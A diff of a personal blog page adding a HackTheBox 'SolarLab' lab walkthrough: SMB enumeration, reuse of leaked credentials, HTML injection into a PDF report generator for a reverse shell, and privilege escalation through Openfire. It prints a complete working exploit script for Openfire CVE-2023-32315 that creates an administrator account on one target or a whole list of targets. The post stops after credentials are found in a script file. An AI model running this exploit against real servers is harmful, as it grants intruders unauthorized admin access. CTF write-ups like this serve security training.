@@ -8,8 +8,8 @@
 <meta property="og:title" content="write-ups" />
 <meta name="author" content="GitHub User" />
 <meta property="og:locale" content="en_US" />
-<meta name="description" content="This is my blog, here you will find more information about me, in addition to my work on HackTheBox and some interesting apps i’ve developed" />
-<meta property="og:description" content="This is my blog, here you will find more information about me, in addition to my work on HackTheBox and some interesting apps i’ve developed" />
+<meta name="description" content="This is my blog, here you will find more information about me, as well as my work on HackTheBox and some interesting apps i’ve developed." />
+<meta property="og:description" content="This is my blog, here you will find more information about me, as well as my work on HackTheBox and some interesting apps i’ve developed." />
 <link rel="canonical" href="https://your-site-url/write-ups/" />
 <meta property="og:url" content="https://your-site-url/write-ups/" />
 <meta property="og:site_name" content="Pwn3d777" />
@@ -17,7 +17,7 @@
 <meta name="twitter:card" content="summary" />
 <meta property="twitter:title" content="write-ups" />
 <script type="application/ld+json">
-{"@context":"https://schema.org","@type":"WebPage","author":{"@type":"Person","name":"GitHub User"},"description":"This is my blog, here you will find more information about me, in addition to my work on HackTheBox and some interesting apps i’ve developed","headline":"write-ups","url":"https://your-site-url/write-ups/"}</script>
+{"@context":"https://schema.org","@type":"WebPage","author":{"@type":"Person","name":"GitHub User"},"description":"This is my blog, here you will find more information about me, as well as my work on HackTheBox and some interesting apps i’ve developed.","headline":"write-ups","url":"https://your-site-url/write-ups/"}</script>
 <!-- End Jekyll SEO tag -->
 <link rel="stylesheet" href="/assets/css/style.css">
   <link rel="icon" type="image/png" href="/assets/favicon.png" />
@@ -47,14 +47,6 @@
 <main class="page-content" aria-label="Content">
       <div class="wrapper">
         
-  <div class="author-box">
-
-<div class="description">This is my blog, here you will find more information about me, in addition to my work on HackTheBox and some interesting apps i've developed
-</div>
-
-</div>
-
-
 <link rel="stylesheet" href="/assets/css/custom.css">
 
 <section class="post-feed">
@@ -878,6 +870,303 @@
 <div class="post-thumb">
   <div class="post-text">
     <p><h1 id="solarlab">SolarLab</h1>
+<p><br /><br /></p>
+<h1 id="1-enumeration">1. Enumeration</h1>
+<p><br /><br />
+Start with nmap enumeration, we have a http service and smb services running, it tries to redirect us to a domain, once we add the domain to etc/hosts file 
+<br /><br />
+<img src="/assets/images/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e_Untitled.png" alt="Untitled" />
+<br /><br />
+In the http service we didn’t find anything interesting at least in the main url, in the other one there is a log in page, we may try to get credentials or something like that
+<br /><br />
+<img src="/assets/images/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e_Untitled_1.png" alt="Untitled" />
+<br /><br />
+we can scan port 6791 and it disclose another url: http:report.solarlab.htb
+<br /><br />
+<img src="/assets/images/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e_Untitled_2.png" alt="Untitled" />
+<br /><br />
+Using crackmapexec to search some share files we found some files
+<br /><br />
+<img src="/assets/images/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e_Untitled_3.png" alt="Untitled" />
+<br /><br />
+<img src="/assets/images/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e_Untitled_4.png" alt="Untitled" />
+<br /><br />
+<img src="/assets/images/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e_Untitled_5.png" alt="Untitled" />
+<br /><br />
+The .xlsx file disclose information about usernames and passwords, now we need to find a place where we can use it
+<br /><br />
+<img src="/assets/images/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e_Untitled_6.png" alt="Untitled" />
+<br /><br /></p>
+<h1 id="2-user-flag">2. User flag</h1>
+<p><br /><br />
+After we proceed to spray passwords on smb we realize there’s nothing which can help us to get progress
+<br /><br />
+<img src="/assets/images/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e_Untitled_7.png" alt="Untitled" />
+<br /><br />
+If you can see, there is a trick right here, in the .xlsx file all usernames are composed by a name and a letter which is the first letter of the next or previous name, taking this and looking for anomalies bakle.byte is the only one user name that doesn’t follow this pattern, but what happens if we make that blake follow this pattern? It would be something like:
+<br /><br />
+Usename: blakeb
+<br /><br />
+Password: password
+<br /><br />
+<img src="/assets/images/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e_Untitled_8.png" alt="Untitled" />
+<br /><br />
+Those are valid credentials to the web application running on 6791
+<br /><br />
+<img src="/assets/images/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e_Untitled_9.png" alt="Untitled" />
+<br /><br />
+We can leave a request on this page, this request generates a pdf file, let’s search if we can do anything with this
+<br /><br />
+<img src="/assets/images/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e_Untitled_10.png" alt="Untitled" />
+<br /><br />
+<img src="/assets/images/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e_Untitled_11.png" alt="Untitled" />
+<br /><br />
+According with the name of the machine this looks promising
+<br /><br />
+<img src="/assets/images/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e_Untitled_12.png" alt="Untitled" />
+<br /><br />
+<img src="/assets/images/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e_Untitled_13.png" alt="Untitled" />
+<br /><br />
+<img src="/assets/images/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e_Untitled_14.png" alt="Untitled" />
+<br /><br />
+But we need to find a way to inject this code here and execute remote commands with this.
+<br /><br />
+Previously we tried to change the .png file on the request but it is properly sanitized so we will try to inject the html code in leave request parameter.
+<br /><br />
+<img src="/assets/images/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e_Untitled_15.png" alt="Untitled" />
+<br /><br />
+here we have the payload to exploit the vulnerability but to get the reverse shell we will need to use powershell base 64 
+<br /><br />
+<img src="/assets/images/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e_Untitled_16.png" alt="Untitled" />
+<br /><br />
+<img src="/assets/images/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e_Untitled_17.png" alt="Untitled" />
+<br /><br />
+User flag got succesfully
+<br /><br />
+<img src="/assets/images/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e_Untitled_18.png" alt="Untitled" />
+<br /><br /></p>
+<h1 id="3priv-esc">3.Priv esc</h1>
+<p><br /><br />
+There is a openfire user, as we have learnt there are some vulnerabilities around there 
+<br /><br />
+<img src="/assets/images/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e_Untitled_19.png" alt="Untitled" />
+<br /><br />
+So check if there is a service running locally and try to port forwarding using that port
+<br /><br />
+<img src="/assets/images/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e_Untitled_20.png" alt="Untitled" />
+<br /><br />
+<img src="/assets/images/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e_Untitled_21.png" alt="Untitled" />
+<br /><br />
+<img src="/assets/images/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e_Untitled_22.png" alt="Untitled" />
+<br /><br />
+<img src="/assets/images/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e_Untitled_23.png" alt="Untitled" />
+<br /><br /></p>
+<ul>
+  <li>CVE-2023-32315
+<br /><br />
+  This vulnerability lies within the web-based Admin Console, allowing a path traversal attack through the setup environment. This flaw allows unauthenticated users to access restricted pages intended for administrative users
+<br /><br />
+    <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="kn">import</span> <span class="nn">random</span>
+  <span class="kn">import</span> <span class="nn">string</span>
+  <span class="kn">import</span> <span class="nn">argparse</span>
+  <span class="kn">from</span> <span class="nn">concurrent.futures</span> <span class="kn">import</span> <span class="n">ThreadPoolExecutor</span>
+  <span class="kn">import</span> <span class="nn">HackRequests</span>
+    
+  <span class="n">artwork</span> <span class="o">=</span> <span class="s">'''
+    
+   ██████╗██╗   ██╗███████╗    ██████╗  ██████╗ ██████╗ ██████╗      ██████╗ ██████╗ ██████╗  ██╗███████╗
+  ██╔════╝██║   ██║██╔════╝    ╚════██╗██╔═████╗╚════██╗╚════██╗     ╚════██╗╚════██╗╚════██╗███║██╔════╝
+  ██║     ██║   ██║█████╗█████╗ █████╔╝██║██╔██║ █████╔╝ █████╔╝█████╗█████╔╝ █████╔╝ █████╔╝╚██║███████╗
+  ██║     ╚██╗ ██╔╝██╔══╝╚════╝██╔═══╝ ████╔╝██║██╔═══╝  ╚═══██╗╚════╝╚═══██╗██╔═══╝  ╚═══██╗ ██║╚════██║
+  ╚██████╗ ╚████╔╝ ███████╗    ███████╗╚██████╔╝███████╗██████╔╝     ██████╔╝███████╗██████╔╝ ██║███████║
+   ╚═════╝  ╚═══╝  ╚══════╝    ╚══════╝ ╚═════╝ ╚══════╝╚═════╝      ╚═════╝ ╚══════╝╚═════╝  ╚═╝╚══════╝
+                                                                                                           
+  Openfire Console Authentication Bypass Vulnerability (CVE-2023-3215)
+  Use at your own risk!
+  '''</span>
+    
+  <span class="k">def</span> <span class="nf">generate_random_string</span><span class="p">(</span><span class="n">length</span><span class="p">):</span>
+      <span class="n">charset</span> <span class="o">=</span> <span class="n">string</span><span class="p">.</span><span class="n">ascii_lowercase</span> <span class="o">+</span> <span class="n">string</span><span class="p">.</span><span class="n">digits</span>
+      <span class="k">return</span> <span class="s">''</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="n">random</span><span class="p">.</span><span class="n">choice</span><span class="p">(</span><span class="n">charset</span><span class="p">)</span> <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">length</span><span class="p">))</span>
+    
+  <span class="k">def</span> <span class="nf">between</span><span class="p">(</span><span class="n">string</span><span class="p">,</span> <span class="n">starting</span><span class="p">,</span> <span class="n">ending</span><span class="p">):</span>
+      <span class="n">s</span> <span class="o">=</span> <span class="n">string</span><span class="p">.</span><span class="n">find</span><span class="p">(</span><span class="n">starting</span><span class="p">)</span>
+      <span class="k">if</span> <span class="n">s</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">:</span>
+          <span class="k">return</span> <span class="s">""</span>
+      <span class="n">s</span> <span class="o">+=</span> <span class="nb">len</span><span class="p">(</span><span class="n">starting</span><span class="p">)</span>
+      <span class="n">e</span> <span class="o">=</span> <span class="n">string</span><span class="p">[</span><span class="n">s</span><span class="p">:].</span><span class="n">find</span><span class="p">(</span><span class="n">ending</span><span class="p">)</span>
+      <span class="k">if</span> <span class="n">e</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">:</span>
+          <span class="k">return</span> <span class="s">""</span>
+      <span class="k">return</span> <span class="n">string</span><span class="p">[</span><span class="n">s</span> <span class="p">:</span> <span class="n">s</span><span class="o">+</span><span class="n">e</span><span class="p">]</span>
+    
+  <span class="n">final_result</span> <span class="o">=</span> <span class="p">[]</span>
+    
+  <span class="k">def</span> <span class="nf">exploit</span><span class="p">(</span><span class="n">target</span><span class="p">):</span>
+      <span class="n">hack</span> <span class="o">=</span> <span class="n">HackRequests</span><span class="p">.</span><span class="n">hackRequests</span><span class="p">()</span>
+      <span class="n">host</span> <span class="o">=</span> <span class="n">target</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">"://"</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span>
+    
+      <span class="c1"># setup 1: get csrf + jsessionid
+</span>      <span class="n">jsessionid</span> <span class="o">=</span> <span class="s">""</span>
+      <span class="n">csrf</span> <span class="o">=</span> <span class="s">""</span>
+    
+      <span class="k">try</span><span class="p">:</span>
+          <span class="n">url</span> <span class="o">=</span> <span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="n">target</span><span class="si">}</span><span class="s">/setup/setup-s/%u002e%u002e/%u002e%u002e/user-groups.jsp"</span>
+    
+          <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
+              <span class="s">"User-Agent"</span><span class="p">:</span> <span class="s">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36"</span><span class="p">,</span>
+              <span class="s">"Accept-Encoding"</span><span class="p">:</span> <span class="s">"gzip, deflate"</span><span class="p">,</span>
+              <span class="s">"Accept"</span><span class="p">:</span> <span class="s">"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"</span><span class="p">,</span>
+              <span class="s">"Connection"</span><span class="p">:</span> <span class="s">"close"</span><span class="p">,</span>
+              <span class="s">"Accept-Language"</span><span class="p">:</span> <span class="s">"zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3"</span><span class="p">,</span>
+              <span class="s">"DNT"</span><span class="p">:</span> <span class="s">"1"</span><span class="p">,</span>
+              <span class="s">"X-Forwarded-For"</span><span class="p">:</span> <span class="s">"1.2.3.4"</span><span class="p">,</span>
+              <span class="s">"Upgrade-Insecure-Requests"</span><span class="p">:</span> <span class="s">"1"</span>
+          <span class="p">}</span>
+          <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"[..] Checking target: </span><span class="si">{</span><span class="n">target</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+          <span class="n">hh</span> <span class="o">=</span> <span class="n">hack</span><span class="p">.</span><span class="n">http</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">)</span>
+          <span class="n">jsessionid</span> <span class="o">=</span> <span class="n">hh</span><span class="p">.</span><span class="n">cookies</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">'JSESSIONID'</span><span class="p">,</span> <span class="s">''</span><span class="p">)</span>
+          <span class="n">csrf</span> <span class="o">=</span> <span class="n">hh</span><span class="p">.</span><span class="n">cookies</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">'csrf'</span><span class="p">,</span> <span class="s">''</span><span class="p">)</span>
+    
+          <span class="k">if</span> <span class="n">jsessionid</span> <span class="o">!=</span> <span class="s">""</span> <span class="ow">and</span> <span class="n">csrf</span> <span class="o">!=</span> <span class="s">""</span><span class="p">:</span>
+              <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"Successfully retrieved JSESSIONID: </span><span class="si">{</span><span class="n">jsessionid</span><span class="si">}</span><span class="s"> + csrf: </span><span class="si">{</span><span class="n">csrf</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+          <span class="k">else</span><span class="p">:</span>
+              <span class="k">print</span><span class="p">(</span><span class="s">"Failed to get JSESSIONID and csrf value"</span><span class="p">)</span>
+              <span class="k">return</span>
+            
+          <span class="c1"># setup 2: add user
+</span>          <span class="n">username</span> <span class="o">=</span> <span class="n">generate_random_string</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span>
+          <span class="n">password</span> <span class="o">=</span> <span class="n">generate_random_string</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span>
+            
+          <span class="n">header2</span> <span class="o">=</span> <span class="p">{</span>
+              <span class="s">"Host"</span><span class="p">:</span> <span class="n">host</span><span class="p">,</span>
+              <span class="s">"User-Agent"</span><span class="p">:</span> <span class="s">"Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0"</span><span class="p">,</span>
+              <span class="s">"Accept-Encoding"</span><span class="p">:</span> <span class="s">"gzip, deflate"</span><span class="p">,</span>
+              <span class="s">"Accept"</span><span class="p">:</span> <span class="s">"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"</span><span class="p">,</span>
+              <span class="s">"Connection"</span><span class="p">:</span> <span class="s">"close"</span><span class="p">,</span>
+              <span class="s">"Cookie"</span><span class="p">:</span> <span class="sa">f</span><span class="s">"JSESSIONID=</span><span class="si">{</span><span class="n">jsessionid</span><span class="si">}</span><span class="s">; csrf=</span><span class="si">{</span><span class="n">csrf</span><span class="si">}</span><span class="s">"</span><span class="p">,</span>
+              <span class="s">"Accept-Language"</span><span class="p">:</span> <span class="s">"zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3"</span><span class="p">,</span>
+              <span class="s">"DNT"</span><span class="p">:</span> <span class="s">"1"</span><span class="p">,</span>
+              <span class="s">"X-Forwarded-For"</span><span class="p">:</span> <span class="s">"1.2.3.4"</span><span class="p">,</span>
+              <span class="s">"Upgrade-Insecure-Requests"</span><span class="p">:</span> <span class="s">"1"</span>
+          <span class="p">}</span>
+    
+          <span class="n">create_user_url</span><span class="o">=</span> <span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="n">target</span><span class="si">}</span><span class="s">/setup/setup-s/%u002e%u002e/%u002e%u002e/user-create.jsp?csrf=</span><span class="si">{</span><span class="n">csrf</span><span class="si">}</span><span class="s">&amp;username=</span><span class="si">{</span><span class="n">username</span><span class="si">}</span><span class="s">&amp;name=&amp;email=&amp;password=</span><span class="si">{</span><span class="n">password</span><span class="si">}</span><span class="s">&amp;passwordConfirm=</span><span class="si">{</span><span class="n">password</span><span class="si">}</span><span class="s">&amp;isadmin=on&amp;create=%E5%88%9B%E5%BB%BA%E7%94%A8%E6%88%B7"</span>
+          <span class="n">hhh</span> <span class="o">=</span> <span class="n">hack</span><span class="p">.</span><span class="n">http</span><span class="p">(</span><span class="n">create_user_url</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">header2</span><span class="p">)</span>
+    
+          <span class="k">if</span> <span class="n">hhh</span><span class="p">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">200</span><span class="p">:</span>
+              <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"User added successfully: url: </span><span class="si">{</span><span class="n">target</span><span class="si">}</span><span class="s"> username: </span><span class="si">{</span><span class="n">username</span><span class="si">}</span><span class="s"> password: </span><span class="si">{</span><span class="n">password</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+              <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">"success.txt"</span><span class="p">,</span> <span class="s">"a+"</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+                  <span class="n">f</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="sa">f</span><span class="s">"url: </span><span class="si">{</span><span class="n">target</span><span class="si">}</span><span class="s"> username: </span><span class="si">{</span><span class="n">username</span><span class="si">}</span><span class="s"> password: </span><span class="si">{</span><span class="n">password</span><span class="si">}</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+          <span class="k">else</span><span class="p">:</span>
+              <span class="k">print</span><span class="p">(</span><span class="s">"Failed to add user"</span><span class="p">)</span>
+          <span class="c1"># setup 3: add plugin
+</span>    
+      <span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+          <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"Error occurred while retrieving cookies: </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+    
+  <span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
+      <span class="k">print</span><span class="p">(</span><span class="n">artwork</span><span class="p">)</span>
+    
+      <span class="c1">## parse argument
+</span>      <span class="n">parser</span> <span class="o">=</span> <span class="n">argparse</span><span class="p">.</span><span class="n">ArgumentParser</span><span class="p">()</span>
+      <span class="n">parser</span><span class="p">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">'-t'</span><span class="p">,</span> <span class="s">'--target'</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s">'The URL of the target, eg: http://127.0.0.1:9090'</span><span class="p">,</span> <span class="n">default</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
+      <span class="n">parser</span><span class="p">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">"-l"</span><span class="p">,</span> <span class="s">"--list"</span><span class="p">,</span> <span class="n">action</span><span class="o">=</span><span class="s">"store"</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s">"List of target url saperated with new line"</span><span class="p">,</span> <span class="n">default</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
+      <span class="n">args</span> <span class="o">=</span> <span class="n">parser</span><span class="p">.</span><span class="n">parse_args</span><span class="p">()</span>
+    
+      <span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">target</span> <span class="ow">is</span> <span class="ow">not</span> <span class="bp">False</span><span class="p">:</span>
+          <span class="n">exploit</span><span class="p">(</span><span class="n">args</span><span class="p">.</span><span class="n">target</span><span class="p">)</span> 
+    	
+      <span class="k">elif</span> <span class="n">args</span><span class="p">.</span><span class="nb">list</span> <span class="ow">is</span> <span class="ow">not</span> <span class="bp">False</span><span class="p">:</span>
+          <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">args</span><span class="p">.</span><span class="nb">list</span><span class="p">)</span> <span class="k">as</span> <span class="n">targets</span><span class="p">:</span>
+              <span class="k">for</span> <span class="n">target</span> <span class="ow">in</span> <span class="n">targets</span><span class="p">:</span>
+                  <span class="n">target</span> <span class="o">=</span> <span class="n">target</span><span class="p">.</span><span class="n">rstrip</span><span class="p">()</span>
+                  <span class="k">if</span> <span class="n">target</span> <span class="o">==</span> <span class="s">""</span><span class="p">:</span>
+                      <span class="k">continue</span>
+                  <span class="k">if</span> <span class="s">"http"</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">target</span><span class="p">:</span>
+                      <span class="n">target</span> <span class="o">=</span> <span class="s">"http://"</span> <span class="o">+</span> <span class="n">target</span>
+                  <span class="n">exploit</span><span class="p">(</span><span class="n">target</span><span class="p">)</span> 
+      <span class="k">else</span><span class="p">:</span>
+          <span class="n">parser</span><span class="p">.</span><span class="n">print_help</span><span class="p">()</span>
+          <span class="n">parser</span><span class="p">.</span><span class="nb">exit</span><span class="p">()</span>
+    
+  <span class="c1"># def main():
+</span>  <span class="c1">#     parser = argparse.ArgumentParser(description="CVE-2023-32315")
+</span>  <span class="c1">#     parser.add_argument("-u", help="Target URL")
+</span>  <span class="c1">#     parser.add_argument("-l", help="File containing URLs")
+</span>  <span class="c1">#     parser.add_argument("-t", type=int, default=10, help="Number of threads")
+</span>    
+  <span class="c1">#     args = parser.parse_args()
+</span>    
+  <span class="c1">#     target_url = args.u
+</span>  <span class="c1">#     file_path = args.l
+</span>  <span class="c1">#     thread = args.t
+</span>    
+  <span class="c1">#     targets = []
+</span>    
+  <span class="c1">#     if target_url is None:
+</span>  <span class="c1">#         with open(file_path, "r") as file:
+</span>  <span class="c1">#             for line in file:
+</span>  <span class="c1">#                 target = line.strip()
+</span>  <span class="c1">#                 if target == "":
+</span>  <span class="c1">#                     continue
+</span>  <span class="c1">#                 if "http" not in target:
+</span>  <span class="c1">#                     target = "http://" + target
+</span>  <span class="c1">#                 targets.append(target)
+</span>    
+  <span class="c1">#         with ThreadPoolExecutor(max_workers=thread) as executor:
+</span>  <span class="c1">#             for target in targets:
+</span>  <span class="c1">#                 executor.submit(exploit, target)
+</span>                    
+    
+  <span class="c1">#     else:
+</span>  <span class="c1">#         exploit(target_url)
+</span>    
+  <span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
+      <span class="n">main</span><span class="p">()</span>
+</code></pre></div>    </div>
+    <p><br /><br />
+<img src="/assets/images/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e_Untitled_24.png" alt="Untitled" />
+<br /><br />
+Log in as the new admin user
+<br /><br />
+<img src="/assets/images/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e_Untitled_25.png" alt="Untitled" />
+<br /><br />
+Exploit the vulnerability uploading the plugin
+<br /><br />
+<img src="/assets/images/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e_Untitled_26.png" alt="Untitled" />
+<br /><br />
+Use the same rev shell that we used before to get user flag
+<br /><br />
+<img src="/assets/images/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e_Untitled_27.png" alt="Untitled" />
+<br /><br />
+Now we are Openfire user, and we are able to dig into configuration files on the machine, it is also possible to look for logs and scripts
+<br /><br />
+<img src="/assets/images/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e_Untitled_28.png" alt="Untitled" />
+<br /><br />
+<img src="/assets/images/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e_Untitled_29.png" alt="Untitled" />
+<br /><br />
+In .script file we found administrator credentials with a encrypted password, but some code lines below we have the key
+<br /><br />
+<img src="/assets/images/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e_Untitled_30.png" alt="Untitled" />
+<br /><br />
+<img src="/assets/images/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e_Untitled_31.png" alt="Untitled" />
+<br /><br />
